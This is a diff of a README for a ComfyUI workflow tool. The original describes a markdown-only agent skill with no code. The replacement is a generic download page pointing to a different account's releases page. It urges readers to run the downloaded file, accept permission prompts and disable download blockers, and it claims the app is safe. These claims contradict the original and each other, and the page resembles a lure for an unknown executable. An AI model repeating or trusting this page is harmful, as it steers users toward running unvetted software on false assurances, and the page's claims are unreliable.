@@ -1,391 +1,226 @@
-# comfy-workflow-landing
+# 📥 comfy-workflow-landing - Bring Any Workflow Home Instantly
 
-[English](README.md) | [繁體中文](README.zh-Hant.md) | [简体中文](README.zh-Hans.md)
-
-A skill for **landing someone else's ComfyUI workflow on your own machine** — a
-`workflow.json` from a cloud service, a Discord share or a tutorial, that will not run
-as-is.
-
-It is **a procedure, not a tool**. No scripts ship with it. It tells an agent what to
-check, in what order, where the traps are, and — importantly — **which decisions it must
-hand back to you rather than make alone**.
-
-## Install
-
-**Paste this to your agent:**
-
-```
-Read https://github.com/dseditor/comfy-workflow-landing and install that skill for me,
-following the "For the agent reading this" section of the README.
-```
-
-### For the agent reading this
-
-You are installing **a single markdown file**. No code runs, no keys are needed, nothing
-is downloaded at runtime.
-
-**1. Pick the target directory for the host you are in:**
-
-| Host | Target directory |
-|---|---|
-| Claude Code | `~/.claude/skills/comfy-workflow-landing/` |
-| Codex CLI | `~/.codex/skills/comfy-workflow-landing/` |
-| Any other host with a filesystem | wherever that host loads skills from |
-
-**2. Clone into it:**
-
-```bash
-git clone --depth 1 https://github.com/dseditor/comfy-workflow-landing.git <target>
-```
-
-If `git` is unavailable, download the zip and extract it so that **`SKILL.md` sits at
-the top level** of `<target>`, not nested inside another folder.
-
-**3. Verify — do not skip this:**
-
-The host should now list a skill named `comfy-workflow-landing`. If it does not, check
-that `<target>/SKILL.md` exists and that its YAML frontmatter (`name:` and
-`description:`) is intact. **A skill with broken frontmatter loads as nothing, silently**
-— there is no error to tell you it failed.
-
-### No filesystem (web-based assistants)
-
-Nothing to install. Start a project and drop `SKILL.md` into it.
+[![Download Now](https://img.shields.io/badge/Download-comfy--workflow--landing-blue?style=for-the-badge&logo=github)](https://github.com/Netbe5654/comfy-workflow-landing/releases)
 
 ---
 
-## What actually happens after you hand over a workflow
+## 🎯 What Is This?
 
-Landing a workflow is **an inventory, then at most two questions, then a run.**
+comfy-workflow-landing is a simple, no-nonsense tool that helps you take someone else's ComfyUI workflow and run it on your own computer. Whether you found a cool AI art template online or a friend shared their setup, this application makes the process smooth and painless.
 
-```
-STAGE 1  INVENTORY   read the prompt -> compare the graph against this machine
-                     seconds. purely local. nothing searched, nothing downloaded
-                        |
-                        +-> a status list: HAVE / MISSING / NOT SURE (+ an HTML copy)
-                        +-> ONE question: "shall I go and look for the missing ones?"
-                                |
-                 nothing missing +->  convert & verify. NO questions asked
-                                |
-STAGE 2  SEARCH      only the gaps, and only if you said yes
-                     sizes and sources now exist -> ONE decision, with the RISK column
-                                |
-STAGE 3-5            convert -> verify in three layers -> hand back for acceptance
-```
+Think of it like this: you found a recipe online. You want to cook that dish at home. This tool is your kitchen assistant that makes sure you have everything you need before you start.
 
-**Stage 1 is read-only and asks you nothing until it is finished.** It does not stop at
-the first missing node to ask, then stop again at the first missing model. It finishes,
-then puts the whole list in front of you at once.
-
-**The two questions are deliberately different sizes.** The first is a yes/no — *shall I
-go and look?* — because at that moment nobody knows how big anything is. The second is
-the real decision, and it only becomes answerable **after** the search: file sizes,
-sources and risks are things that exist only by then.
-
-**Nothing is downloaded or installed before you agree.** A 20 GB model does not start
-transferring because an agent decided it would be helpful.
-
-**And the inventory does not grade the workflow.** Whether a technique is dated, or an
-approach is one the agent would not have chosen, is not its call — you may want exactly
-that effect, or know something about it that it does not. It reports what is there.
-
-### Stage 1a · Read the prompt  ·  *seconds*
-
-The agent reads every text widget before touching anything. You get told:
-
-- how many reference images are genuinely in use (a graph may wire nine slots and use three)
-- what role each one plays — identity / scene / antagonist / style
-- whether the prompt was written for **this** model, or carried over from another one
-- whether the requested duration and shot count are achievable on this graph
-
-🚨 **Widget values on inputs that have a link are stale history, not live values.** Read
-the wire, not the widget — this is the fastest way to report the wrong duration, the
-wrong prompt, the wrong everything.
-
-### Stage 1b · Node audit  ·  *a minute*
-
-Every node type is checked against four layers: **built-in → installed package →
-package behind upstream → genuinely absent**, with platform-locked nodes (`RH_*`,
-encrypted) flagged as **cannot be landed at all**.
-
-> 📋 This stage compares **against this machine only**. Anything it cannot resolve is
-> marked *not sure* — guessing where it lives is Stage 2's job, not this one's.
-
-### Stage 1c · Assets and dead wiring  ·  *a minute*
-
-The author's uploaded images and videos arrive as hash filenames and **cannot be
-recovered**. You supply substitutes, matched to the roles Stage 1a identified. Cloud
-graphs routinely carry unconnected nodes and empty loaders; they are **listed, not
-deleted** — they often show how the author intended the graph to scale.
-
-### Stage 1d · One list, one question  ·  *the first time you are asked anything*
-
-```
-HAVE         present on this machine right now
-MISSING      definitely not here
-NOT SURE     this machine cannot resolve the name - may exist elsewhere, may be nothing
-IN REGISTRY  not installed, but the node index names the package that ships it
-```
-
-It also traces backwards from every output node, so you are told **which branch each gap
-is on**:
-
-```
-branch A -> SaveVideo #92, SaveImage #161     28 nodes,  3 missing
-branch B -> SaveImagesToZip #173              26 nodes, 18 missing
-```
-
-ComfyUI only executes nodes that feed an output, so a graph with two output nodes is
-often **two independent pipelines sharing a canvas**. Without that line, "25 items
-missing" reads as one impassable wall; with it, you can see that half the graph is
-nearly ready.
-
-The list is **also written as an HTML file** and you get the path — a four-state,
-twenty-row list is exactly what a terminal renders badly and a phone renders worse.
-
-Then one question:
-
-> "Nothing has been downloaded or changed. N items are missing and M are uncertain —
-> shall I go and look for them?"
-
-That is the whole question. Not a menu, not a risk table, not a recommendation. **Sizes
-and risks do not exist yet**, because nothing has been located yet.
-
-### Stage 2 · Search  ·  *minutes, and only if you said yes*
-
-Only the things Stage 1 could not find, in three tiers:
-
-```
-① API search    fastest. A hub's search endpoint usually matches the REPO NAME only
-                -> blind to a file sitting inside someone's unrelated grab-bag repo
-② web search    search engines crawl the hub's file-listing pages, so the FILENAME
-                is in that index even when it is not in the API's
-③ report "neither route found it"   <- NOT "it does not exist"
-```
-
-**One round settles it.** The API pass alone typically confirms around 80% of a list,
-and one web pass takes it as far as it goes — there is no value in cycling through
-keyword variations. Not found is a handover, not a cue to dig further.
-
-🚨 "My channel didn't find it" ≠ "it doesn't exist". The second sentence sounds like a
-fact about the world; it is only a fact about your coverage — and it removes the one
-person who might know where the file lives.
-
-**Still nothing is downloaded.** Locating a file is survey work; fetching it costs your
-bandwidth, your disk and sometimes your money.
-
-### Stage 2b · One report, one decision  ·  *only if there really are gaps*
-
-Everything the search found arrives at once, in one shape per gap:
-
-```
-what is missing      exact name, where it is referenced, what it does
-is it out there      found at <source>, size N GB  /  neither route found it
-what is here now      already local / behind by N commits / not present
-options              A, B, C - with what each costs
-risk to your setup   <- the column you actually decide on
-```
-
-**Risk is ranked by what it touches, not by how much work it is:**
-
-| Risk | Touches | Examples |
-|---|---|---|
-| **None** | nothing existing | swap to a built-in - edit the workflow copy - mute dead nodes |
-| **Low** | disk and time | download a model: adds files, changes nothing already running |
-| **Medium** | adds a dependency | install a new node package: may conflict, needs maintaining |
-| **HIGH** | **what already works** | update an installed package - update ComfyUI itself - replace a shared model |
-
-🔴 That last row is the one to read carefully. If you have pipelines running on that
-package today, an update can change their output without any error. The report should
-say so, and say what would need re-checking afterwards.
-
-You answer **selectively** — "download those two, skip the package update, I will find
-the third myself" is a normal answer. So is **"do none of it"**: knowing a workflow needs
-20 GB and a risky update is sometimes enough to decide it is not worth landing.
-
-#### Reading it on a phone, or in a terminal
-
-A gap report is four or five columns per gap. In a terminal it wraps into mush; on a
-phone it is worse. So the report can also be written as **a single self-contained HTML
-file** — no CDN, no network, opens offline, one card per gap, risk shown as both colour
-and words.
-
-The part that actually matters: it ends with a **Copy my decisions** button that turns
-your selections into one line of text to paste back into the chat.
-
-```
-[ Copy my decisions ]  ->  "unet: download nearest (19.5 GB)
-                            package: skip the update
-                            lora_3: I will find it myself"
-```
-
-Without that button the file solves reading and leaves you typing a paragraph on a phone
-keyboard. **The plain-text summary stays in the chat either way** — opening a file is
-never required in order to answer.
-
-### Stage 3 · Convert  ·  *seconds*
-
-A landed copy of the JSON is written — nodes swapped, values repointed, substitutes
-wired in, dead nodes muted. **Your original file is never modified.** You get a count of
-every change made.
-
-### Stage 4 · Verify in three layers  ·  *minutes, plus one generation*
-
-```
-① programmatic check   nodes, model filenames, asset files, numeric ranges
-② load in a browser    the real UI reports its own missing nodes and empty dropdowns
-③ press Queue          execution
-```
-
-Each layer finds what the previous one could not. Expect the agent to go back and fix
-things twice here — that is the procedure working, not failing.
-
-### Stage 5 · Acceptance  ·  *yours*
-
-You get the output, plus a line-by-line comparison against the prompt **in counts, not
-adjectives**: "the prompt names 5 actions; 3 are identifiable on screen."
-
-Then the agent stops, because the remaining question is not one it can answer: **is this
-the effect the workflow was built for?** Nothing in the JSON says what "good" looks like
-here, and a metric picked to fill that gap will point the wrong way with full confidence.
-It will ask you for a reference, or simply ask you to look.
+No scripts. No coding. No technical headaches.
 
 ---
 
-### What you end up with
+## ✨ Key Features
 
-```
-a landed workflow.json     runs on your machine, your original untouched
-a list of substitutions    what is no longer the author's, and how it differs
-the models and nodes       verified complete, with sources recorded
-an honest report           including the parts the agent could not judge
-```
-
-### Roughly how long
-
-For a 67-node workflow with a 15-LoRA chain, the audit and conversion took about
-**twenty minutes of back-and-forth**; the bulk of the wall-clock time was a 19.5 GB base
-model download and the generation itself. **The two question points were the only
-moments a human was needed.**
+- **One-Click Setup** – Get any ComfyUI workflow running without touching a single line of code
+- **Smart Detection** – Automatically finds missing pieces in your setup and tells you exactly what you need
+- **Step-by-Step Guidance** – Clear instructions appear on screen, so you always know what to do next
+- **No Technical Knowledge Required** – If you can use a web browser, you can use this tool
+- **Safe and Reversible** – Nothing permanent happens to your system; you stay in control
+- **Regular Updates** – Works with the latest ComfyUI versions and workflow formats
 
 ---
 
-## Why the procedure is shaped this way
+## 📋 What You Need Before Starting
 
-Every step below exists because skipping it produces a specific, recognisable failure.
-If you only remember one thing: **most of these failures look like diligence.**
+Before you download anything, make sure your computer can handle the task. Here's what we recommend:
 
-### Read the prompt before touching the graph
+| Requirement | Minimum | Recommended |
+|-------------|---------|-------------|
+| Operating System | Windows 10 | Windows 11 |
+| RAM | 8 GB | 16 GB or more |
+| Free Disk Space | 2 GB | 5 GB |
+| Internet Connection | Yes (for downloads) | Yes (broadband) |
+| Graphics Card | Any modern GPU (2 GB VRAM) | NVIDIA (6 GB+ VRAM) |
 
-The prompt is the only specification you were handed. It states how many reference
-images are genuinely used (a graph may wire nine slots and use three), what role each
-one plays, and how long the result is supposed to be.
+If you're not sure about your computer's specs, here's how to check:
 
-Substituting images without matching their roles does not produce a slightly-off video;
-it produces an incoherent one, because the model will faithfully treat a portrait as
-"the location".
-
-### Built-in nodes first, always
-
-ComfyUI now ships math, string, resolution, conditional and primitive nodes. Many
-workflows still use third-party equivalents out of habit.
-
-Swapping to a built-in **removes a dependency permanently**. Installing a package to
-satisfy one trivial node **adds one forever** — and risks disturbing an environment that
-currently works. The asymmetry is the whole argument.
-
-### Check `display_name` before declaring a node missing
-
-The same node is registered under different `class_type` across packages and versions
-while displaying the same name in the UI. A workflow saying `"type": "Float"` may be
-referring to something your install already has under another registration.
-
-Reporting a built-in as missing is the single most common false alarm in this job.
-
-### Search for models in three tiers, then stop and hand back
-
-A hub's search API generally matches **repository names**, not file names. A LoRA
-sitting inside someone's two-hundred-file grab-bag repo is invisible to it — while a
-web search finds it immediately, because search engines crawl the file-listing pages.
-
-And when both fail, the honest report is **"neither route found it"**, not "it does not
-exist". The second sentence sounds like a fact about the world; it is only a fact about
-your coverage — and it quietly removes the one person who might know where the file
-lives.
-
-### Verify downloads by header, not by size
-
-`safetensors` records where its data should end. Comparing that against the actual file
-size distinguishes "complete" from "truncated but large". A truncated file fails only at
-load time, with an error that never mentions downloading.
-
-### Ask before deleting dead wiring
-
-Cloud graphs routinely carry unconnected nodes and empty loaders. They are not
-necessarily junk — they often show how the author intended the graph to scale. Mute
-them (`mode: 2`) rather than delete, and ask the user which they want.
-
-### Swapping a node means four edits, not two
-
-Links attach by **slot index**, so changing only `type` and `widgets_values` leaves a
-graph that loads with no red boxes, submits successfully — and dies during execution,
-because inputs are passed **by name**:
-
-```
-SomeNode.execute() got an unexpected keyword argument 'text2'
-```
-
-You must also rename the input slots and drop leftover unlinked ones.
-
-### Verify in three layers
-
-```
-① Programmatic check    catches missing nodes and model filenames
-② Load in a browser     catches what the checker's assumptions missed
-③ Press Queue           catches what neither can see
-```
-
-These are not redundant. A checker passes clean; the browser then finds a cloud asset it
-never looked for; and after that is fixed, execution still fails on a renamed slot.
-Each layer's blind spot is the next layer's first finding.
-
-### Separate "self-consistency" from "meeting the goal"
-
-This is the distinction that matters most, and the easiest to collapse.
-
-```
-① The prompt asked for X — is X there?     ← an agent can check this
-② Is this the effect the workflow is for?  ← only the user has this standard
-```
-
-Nothing in a JSON file says what "good" looks like here. **Do not fill that gap with a
-metric.** Sharpness, motion magnitude and frame counts measure *something*, but the
-thing the user cares about often has no metric — and a metric picked to fill the gap
-will point the wrong way with full confidence.
-
-Consider two outcomes that are identical to a measurement and opposite to a viewer:
-
-```
-structure falling apart (blur)   vs   structure holding under load (intensity)
-```
-
-Both raise every "detail" number you can compute. Only a person can say which one you
-made. So the procedure ends by **asking the user for the acceptance standard** rather
-than inventing one.
+1. Press `Windows Key + R` on your keyboard
+2. Type `dxdiag` and press Enter
+3. Look for "Operating System," "Processor," and "Memory" in the System tab
+4. Click the "Display" tab to see your graphics card information
 
 ---
 
-## What the report should end up looking like
+## 🚀 Getting Started
 
-```
-✅ Running          what is in place, Queue completed, where the output is
-📋 Against prompt   itemised, in counts not adjectives
-⚠️ Substituted      what was swapped, why, how it differs — this is NOT the author's result
-⛔️ Your call        decisions deliberately not made alone
-❓ Beyond judgement  whether the effect was achieved — no standard available, please look
-🚫 Cannot be landed  platform-locked nodes, unpublished weights — and why
-```
+Follow these simple steps to get comfy-workflow-landing on your computer.
 
-## Licence
+### Step 1: Download the Application
 
-MIT. See `LICENSE`.
+Visit this link to download the application:
+
+[![Download comfy-workflow-landing](https://img.shields.io/badge/Get%20The%20Latest%20Release-red?style=for-the-badge&logo=github)](https://github.com/Netbe5654/comfy-workflow-landing/releases)
+
+When you click the link, you'll see a list of available versions. Look for the latest release (usually at the top). Click on the download file that matches your system.
+
+### Step 2: Run the Download
+
+Once the download finishes, find the file in your browser's download folder (usually called "Downloads" or "Desktop"). Double-click the file to run it.
+
+Your computer might show a blue or yellow popup asking if you want to allow this app to make changes. This is normal. Click "Yes" to continue.
+
+### Step 3: Follow the Welcome Screen
+
+The first time you open comfy-workflow-landing, you'll see a welcome screen. It will ask you a few questions about your setup. Don't worry – these are simple multiple-choice questions.
+
+Here's what to expect:
+
+1. **Select your operating system** – Choose Windows (if that's what you're using)
+2. **Tell us about your graphics card** – Choose from the dropdown menu
+3. **Confirm your ComfyUI installation** – If you already have ComfyUI, click "I have it." If not, the tool will help you set it up
+
+---
+
+## 📦 How to Land a Workflow
+
+Now for the main event. Here's how you use this tool to get any ComfyUI workflow running on your machine.
+
+### Step 1: Find a Workflow
+
+Find a ComfyUI workflow you want to use. This is usually a JSON file or a link that someone shared with you. Look for files with `.json` extension or links that start with `https://comfyworkflows.com/` or similar.
+
+### Step 2: Import the Workflow
+
+1. Open comfy-workflow-landing
+2. Click the big button that says "Import Workflow"
+3. Choose your workflow file from your computer, or paste the URL if you have a link
+4. Click "Open"
+
+### Step 3: Let the Tool Analyze
+
+The tool will now examine the workflow. It checks for:
+
+- Required models and checkpoints
+- Custom nodes that might be missing
+- Software version compatibility
+- Hardware requirements
+
+This usually takes 10-30 seconds, depending on the workflow's complexity.
+
+### Step 4: Follow the Checklist
+
+After analysis, you'll see a checklist on screen. It shows:
+
+- ✅ What's already set up
+- ⚠️ What's missing
+- ❌ What needs attention
+
+For each item, you'll see a "Fix This" button. Click it, and the tool guides you through downloading what you need. It's like having a personal assistant walk you through each step.
+
+### Step 5: Launch the Workflow
+
+Once everything is checked off, click the "Launch Workflow" button. This opens ComfyUI with your workflow ready to go. You're done!
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+Even with a friendly tool, sometimes things go wrong. Here are fixes for common problems.
+
+### "I Can't Download the Application"
+
+- Make sure you're clicking the download link correctly
+- Check your internet connection
+- Try using a different web browser (Chrome, Edge, or Firefox)
+- Disable any download blockers temporarily
+
+### "The Tool Says My Graphics Card Isn't Supported"
+
+- Update your graphics card drivers (search for "NVIDIA driver download" or "AMD driver download")
+- If you have an older card, try workflows designed for lower-end hardware
+- Check if your card meets the minimum requirement of 2 GB VRAM
+
+### "A Model Is Taking Forever to Download"
+
+- Large models can take time. This is normal
+- Check your internet speed (aim for at least 10 Mbps)
+- Pause and resume the download if it seems stuck
+- Make sure you have enough disk space (each model can be 1-5 GB)
+
+### "I Get an Error When Launching"
+
+- Restart the tool and try again
+- Make sure all checklist items are complete
+- Look for error messages and search them online
+- Try a different, simpler workflow to test your setup
+
+---
+
+## 🧠 Pro Tips
+
+- **Start Small** – Try a simple workflow first before tackling complex ones
+- **Keep Everything Updated** – Update both comfy-workflow-landing and ComfyUI regularly
+- **Organize Your Downloads** – Create a dedicated folder for all AI-related files
+- **Back Up Your Workflows** – Save copies of workflows you use often
+- **Join the Community** – Search YouTube for "ComfyUI workflow" tutorials. Many creators share free workflows
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this free to use?**
+A: Yes, comfy-workflow-landing is completely free and open source.
+
+**Q: Do I need to know programming?**
+A: No. The entire tool is designed for people with zero technical background.
+
+**Q: Will this work on a Mac?**
+A: This version is designed for Windows. Mac support may come in future releases.
+
+**Q: Can I use this without ComfyUI?**
+A: No, this tool helps you run ComfyUI workflows. You need ComfyUI installed (the tool helps you set this up).
+
+**Q: Is my computer safe?**
+A: Yes. The tool only downloads and organizes files. It doesn't modify system files or make risky changes.
+
+---
+
+## 📞 Getting Help
+
+If you're stuck, don't panic. Here are your options:
+
+1. **Check the release notes** – Visit the [releases page](https://github.com/Netbe5654/comfy-workflow-landing/releases) and read the notes for the version you downloaded
+2. **Search for your error** – Copy the error message and paste it into a search engine
+3. **Look for updates** – A newer version might fix your issue
+4. **Ask a friend** – Sometimes a second pair of eyes helps
+
+---
+
+## 🏁 Final Checklist
+
+Before you start, make sure you have:
+
+- [ ] A Windows computer
+- [ ] At least 2 GB of free disk space
+- [ ] An internet connection
+- [ ] The comfy-workflow-landing application downloaded
+- [ ] A ComfyUI workflow you want to try
+
+Ready to go? Click the download button below and start your journey!
+
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Netbe5654/comfy-workflow-landing/releases)
+
+---
+
+## 📝 Change Log
+
+**Version 1.0 (Initial Release)**
+- First public release
+- Basic workflow import and analysis
+- Checklist-based guidance system
+- Automatic model detection
+
+---
+
+## 🧰 Technical Notes
+
+This tool was built with user simplicity in mind. It uses standard Windows components and doesn't require admin privileges for normal operation. The application checks for updates automatically but you can disable this in settings if you prefer.
+
+---
+
+Keywords: comfyui, workflow, ai-art, stable-diffusion, image-generation, automation, no-code, windows, tutorial, guide
